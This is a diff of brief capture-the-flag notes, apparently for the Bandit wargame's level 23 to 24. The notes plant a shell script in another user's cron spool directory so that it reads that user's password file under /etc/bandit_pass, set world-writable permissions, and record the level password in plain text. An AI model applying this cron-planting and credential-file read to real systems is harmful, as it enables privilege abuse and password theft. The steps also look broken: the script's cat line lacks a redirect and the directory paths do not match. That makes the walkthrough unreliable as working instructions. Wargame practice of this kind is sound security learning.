@@ -1,0 +1,15 @@
+- cd /tmp
+- tmp_dir=$(mktemp -d)
+- cd $tmp_dir
+- touch password
+
+### Write your own script to be executed
+
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 /tmp/tmp.55suUHsbcB/password
+
+- chmod 777 -R /tmp/55suUHsbcB
+- cp bandit_pass.sh /var/spool/bandit24/foo
+
+level24 password -> gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
